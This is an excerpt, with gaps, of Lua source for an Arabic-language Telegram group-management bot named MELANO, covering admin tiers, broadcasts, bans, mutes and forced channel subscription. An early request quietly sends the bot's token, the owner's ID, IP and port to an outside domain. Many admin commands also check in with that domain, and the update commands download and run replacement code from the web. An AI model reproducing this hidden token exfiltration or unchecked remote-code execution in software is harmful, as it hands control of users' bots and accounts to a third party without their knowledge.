...
https.request("https://nbgvy6.ml/ASHTRAKLUA/indexx.php?Get=MELANO&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
print("::MELANO::")
local RunMELANO = io.open("MELANO", 'w')
RunMELANO:write([[
#!/usr/bin/env bash
cd $HOME/MELANO
token="]]..database:get(Server.."Token_Write")..[["
...
os.execute('chmod +x MELANO;sudo chmod +x ./WtN;./WtN')
end
Files_Info_Get()
end 
...
function DevMELANO(msg) 
local hash = database:sismember(bot_id.."Dev:MELANO:2", msg.sender_user_id_) 
...
if hash or SudoBot(msg) or DevMELANO(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevMELANO(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevMELANO(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevMELANO(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevMELANO(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevMELANO(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevMELANO(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
...
var = true  
elseif database:sismember(bot_id.."Dev:MELANO:2", user_id) then
var = true  
...
if database:sismember(bot_id..'MELANO:ProGroups',msg.chat_id_) then
var = true
else
...
local UserName = (data.username_ or "MELANOTEM")
...
MELANO_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
MELANO_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
MELANO_Msg = 'امبروطور التفاعل' 
...
function plugin_MELANO(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.MELANO and msg then
pre_msg = plugin.MELANO(msg)
end
end
end
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
function SourceMELANO(msg,data)
if msg then
...
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
...
if not DevMELANO(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
if DevMELANO(msg) and msg.reply_to_message_id_ ~= 0  then    
...
if text == 'تفعيل التواصل ✯' and DevMELANO(msg) then  
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == 'تعطيل التواصل ✯' and DevMELANO(msg) then  
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == 'تفعيل البوت الخدمي ✯' and DevMELANO(msg) then  
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == 'تعطيل البوت الخدمي ✯' and DevMELANO(msg) then  
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == 'ضع كليشه ستارت ✯' and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == 'حذف كليشه ستارت ✯' and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == 'معلومات السيرفر ✯' and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == 'تحديث السورس ✯' and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
os.execute('rm -rf MELANO.lua')
os.execute('wget https://raw.githubusercontent.com/REXStEaM/MELANO/main/MELANO.lua')
send(msg.chat_id_, msg.id_,'✯︙تم تحديث السورس \n✯︙لديك اخر اصدار لسورس وطن\n✯︙الاصدار » { v 2.7 }')
dofile('MELANO.lua')  
end

if text == 'مطور السورس ✯' and DevMELANO(msg) then 
...
if text == 'تحديث المتجر ✯' and DevMELANO(msg) then 
io.popen("mkdir File_Bot")
os.execute("rm -fr File_Bot/*")
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/REXStEaM/Files_MELANO/main/File_Bot/all.lua") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/REXStEaM/Files_MELANO/main/File_Bot/Reply.lua")  
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/REXStEaM/Files_MELANO/main/File_Bot/games.lua") 
send(msg.chat_id_, msg.id_,'✯︙اهلا بك عزيزي\n✯︙تم تنزيل جميع ملفات المتجر وتحديثه الى اخر اصدار\n✯︙تابعنا لتصلك اخر التحديثات\n✯︙[قناة السورس](t.me/MELANOTEM)')
dofile('MELANO.lua')  
end
...
if text == "اضف رد للكل ✯" and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == "حذف رد للكل ✯" and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == ("مسح ردود المطور ✯") and DevMELANO(msg) then 
...
if text == ("ردود المطور ✯") and DevMELANO(msg) then 
local list = database:smembers(bot_id.."List:Rd:Sudo")
text = "\n✯︙قائمة ردود المطور \n — — — — — — — — —\n"
for k,v in pairs(list) do
...
if text == 'المجموعات المدفوعه ✯' and DevMELANO(msg) then
local List = database:smembers(bot_id.."MELANO:ProGroups")
local MELANO = '✯︙المجموعات المدفوعه \n✯︙تاريخ اليوم '..os.date("%Y/%m/%d")..' \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n'
for k,v in pairs(List) do
local MELANOgetlink = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..v))
if MELANOgetlink.ok == true then 
link_MELANO = '['..MELANOgetlink.result..']'
else
link_MELANO = 'ليست لدي صلاحية الدعوه لهذه المجموعه'
end
MELANO = MELANO..k.."- (`"..v.."`) ~ (`"..database:get(bot_id.."MELANO:ProGroups:Time"..v).."`) \n- "..link_MELANO.." \n" 
end
if #List == 0 then
MELANO = '✯︙لاتوجد مجموعات مدفوعه'
end
send(msg.chat_id_, msg.id_,MELANO) 
end
if text == 'جلب ملف السورس ✯' then
if not DevMELANO(msg) then
send(msg.chat_id_, msg.id_,'✯︙للمطور الاساسي فقط ')
else
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './MELANO.lua', '✯︙نسخة ملف سورس وطن')
end 
end
if (text == "تغير المطور الاساسي ✯") and msg.reply_to_message_id_ == 0 and DevMELANO(msg) then 
...
if text == 'تفعيل الاذاعه ✯' and DevMELANO(msg) then  
...
if text == 'تعطيل الاذاعه ✯' and DevMELANO(msg) then  
...
if text == ("مسح المحظورين عام ✯") and DevMELANO(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n✯︙تم مسح المحظورين عام')
return false
end
if text == ("مسح المكتومين عام ✯") and DevMELANO(msg) then
database:del(bot_id..'Gmute:User')
send(msg.chat_id_, msg.id_, '\n✯︙تم مسح قائمه المكتومين عام')
return false
end
if text == 'الاصـدار ✯' and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == "ضع اسم للبوت ✯" and DevMELANO(msg) then  
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == 'الاحصائيات ✯' and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == 'المشتركين ✯' and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == 'الكروبات ✯' and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == ("المطورين ✯") and DevMELANO(msg) then
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == ("الثانويين ✯") and DevMELANO(msg) then
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
local list = database:smembers(bot_id..'Dev:MELANO:2')
t = "\n✯︙قائمة الثانويين \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == "قناة التحديثات ✯" and DevMELANO(msg) then  
local updatech =[[
...
{{text = '📂┇𝚆𝙰𝚃𝙰𝙽 𝚄𝙿𝙳𝙰𝚃𝙴𝚂.', url="t.me/MELANOTEM"}},
}
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("المحظورين عام ✯") and DevMELANO(msg) then
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == ("قائمه الكتم العام ✯") and DevMELANO(msg) then
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text=="اذاعه خاص ✯" and msg.reply_to_message_id_ == 0 and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text=="اذاعه ✯" and msg.reply_to_message_id_ == 0 and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text=="اذاعه بالتثبيت ✯" and msg.reply_to_message_id_ == 0 and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text=="اذاعه بالتوجيه ✯" and msg.reply_to_message_id_ == 0  and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text=="اذاعه بالتوجيه خاص ✯" and msg.reply_to_message_id_ == 0  and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == 'جلب نسخه الاحتياطيه ✯' and DevMELANO(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين ✯" and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
if text == "تنظيف الكروبات ✯" and DevMELANO(msg) then 
local url,res = https.request('https://nbgvy6.ml/ASHTRAKLUA/kt.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_MELANOTEM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @QQOQQD')   
...
send(msg.chat_id_, msg.id_,'✯︙عدد الكروبات الان » { '..#group..' }'..MELANOk..''..MELANO..'\n✯︙الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
if text and text:match("^رفع مطور @(.*)$") and DevMELANO(msg) then
...
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'MELANOTEM')..')'
status  = '\n✯︙تم ترقيته مطور'
...
if text and text:match("^رفع مطور (%d+)$") and DevMELANO(msg) then
...
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'MELANOTEM')..')'
status  = '\n✯︙تم ترقيته مطور'
...
if text and text:match("^تنزيل مطور @(.*)$") and DevMELANO(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevMELANO(msg) then
...
if MELANO1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'MELANOTEM')..') \n✯︙'..MELANO1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
if msg.content_.text_ then
for k,v in pairs(list) do 
if not database:sismember(bot_id..'MELANO:ProGroups',v) then
send(v, 0,'['..msg.content_.text_..']')  
end
end
elseif msg.content_.photo_ then
...
send(msg.chat_id_,0," ✯︙العضو : {["..data.first_name_.."](t.me/MELANOTEM)}\n✯︙["..MELANO_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ✯︙عذرا » {["..data.first_name_.."](t.me/MELANOTEM)}\n✯︙عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevMELANO(msg) then
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevMELANO(msg) then
...
if text and text:match("^تغير الاشتراك$") and DevMELANO(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '✯︙حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevMELANO(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '✯︙حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رساله الاشتراك ✯" and DevMELANO(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " ✯︙تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك ✯$") and DevMELANO(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '✯︙حسنآ ارسل لي معرف القناة')
return false  
end
if text == "تفعيل الاشتراك الاجباري ✯" and DevMELANO(msg) then  
if database:get(bot_id..'add:ch:id') then
local addchusername = database:get(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_," ✯︙الاشتراك الاجباري مفعل \n✯︙على القناة » ["..addchusername.."]")
else
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_,"✯︙اهلا عزيزي المطور \n✯︙ارفع البوت مشرف في قناتك \n✯︙ثم ارسل معرف قناتك\n✯︙مثال على معرف القناة @MELANOTEM")
end
return false  
end
if text == "تعطيل الاشتراك الاجباري ✯" and DevMELANO(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " ✯︙تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري ✯" and DevMELANO(msg) then  
...
database:set(bot_id.."AL:AddMELANO:stats","✔")
end
...
local MRMELANO = database:get(bot_id.."AL:AddMELANO:stats") or "لم يتم التحديد"
send(msg.chat_id_, msg.id_,"حاله الاضافات هي : {"..MRMELANO.."}\nاذا كانت {✔} الاضافات مفعله\nاذا كانت {✖} الاضافات معطله")
end
...
database:sadd(bot_id.."MELANO:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."MELANO:blocname"..msg.chat_id_)
...
if text == "تفعيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddMELANO:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم التفعيل الاسماء المكتومه')
database:set(bot_id.."block:name:stats"..msg.chat_id_,"open")
end
if text == "تعطيل كتم الاسم" and Constructor(msg) and database:get(bot_id.."AL:AddMELANO:stats") == "✔" then
...
if t2.id_ then 
name_MRMELANO = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_MRMELANO then 
names_MRMELANO = database:smembers(bot_id.."MELANO:blocname"..msg.chat_id_) or ""
if names_MRMELANO and names_MRMELANO[1] then 
for i=1,#names_MRMELANO do 
if name_MRMELANO:match("(.*)("..names_MRMELANO[i]..")(.*)") then 
...
database:set(bot_id.."MELANO:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."MELANO:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."MELANO:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."MELANO:nump"..msg.chat_id_) or 5
send(msg.chat_id_, msg.id_,'✯︙التوحيد '..s1..'\n✯︙عدد الكتم  : '..s2)
end
end
if text == "تفعيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddMELANO:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تفعيل التوحيد')
database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"open")
end
if text == "تعطيل التوحيد" and Constructor(msg) and database:get(bot_id.."AL:AddMELANO:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تعطيل التوحيد')
database:set(bot_id.."kt:twh:stats"..msg.chat_id_,"close")
end
if not Constructor(msg) then
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."MELANO:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function MELANO_mrMELANO_new(mrMELANO1,mrMELANO2)
if mrMELANO2 and mrMELANO2.first_name_ then 
if mrMELANO2.first_name_:match("(.*)"..database:get(bot_id.."MELANO:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."MELANO:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrMELANO_nnn = database:get(bot_id.."MELANO:nump"..msg.chat_id_) or 5
local mrMELANO_nnn2 = database:get(bot_id.."MELANO:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrMELANO_nnn2) == tonumber(mrMELANO_nnn) or tonumber(mrMELANO_nnn2) > tonumber(mrMELANO_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."MELANO:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "✯︙عزيزي >>["..mrMELANO2.username_.."](https://t.me/"..(mrMELANO2.username_ or "MELANOTEM")..")\n✯︙عليك وضع التوحيد ⪼ {"..database:get(bot_id.."MELANO:teh"..msg.chat_id_).."} بجانب اسمك\n✯︙عدد المحاولات المتبقيه {"..(tonumber(mrMELANO_nnn) - tonumber(mrMELANO_nnn2)).."}")
end
end
end
end
bnnaGet(id, MELANO_mrMELANO_new)
end
end
if text == "تفعيل تنبيه الاسماء" and Manager(msg) and database:get(bot_id.."AL:AddMELANO:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تفعيل تنبيه الاسماء')
database:set(bot_id.."Ttn:WtN:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه الاسماء" and Manager(msg) and database:get(bot_id.."AL:AddMELANO:stats") == "✔" then
...
local MELANOChengName = database:get(bot_id.."MELANO:Cheng:Name"..data.id_)
if not data.first_name_ then 
if MELANOChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..MELANOChengName..']')
database:del(bot_id.."MELANO:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if MELANOChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."MELANO:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
end
if text == "تفعيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:AddMELANO:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تفعيل تنبيه المعرف')
database:set(bot_id.."Ttn:Userr:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:AddMELANO:stats") == "✔" then
...
if data.id_ then 
if data.id_ ~= bot_id then
local MELANOChengUserName = database:get(bot_id.."MELANO:Cheng:UserName"..data.id_)
if not data.username_ then 
if MELANOChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..MELANOChengUserName..']')
database:del(bot_id.."MELANO:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if MELANOChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."MELANO:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
end
if text == "تفعيل تنبيه الصور" and Manager(msg) and database:get(bot_id.."AL:AddMELANO:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تفعيل تنبيه الصور')
database:set(bot_id.."Ttn:Ph:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه الصور" and Manager(msg) and database:get(bot_id.."AL:AddMELANO:stats") == "✔" then
...
if data.id_ then 
if data.id_ ~= bot_id then 
local MELANOChengPhoto = database:get(bot_id.."MELANO:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if MELANOChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."MELANO:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if MELANOChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."MELANO:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
Text = "[⦑ Welcome to Source ⦒](t.me/MELANOTEM)\n[✯ ⦑ SOURCE MELANO ⦒](t.me/MELANOTEM)\n✯ Source version : 2.7"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒄𝒉𝒂𝒏𝒏𝒆𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/MELANOTEM"},
{text = '𝒖𝒑𝒅𝒂𝒕𝒆 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/MELANOupdate"}},
{{text = '𝒊𝒏𝒔𝒕𝒂𝒍𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="https://t.me/MELANOTEM/7"},
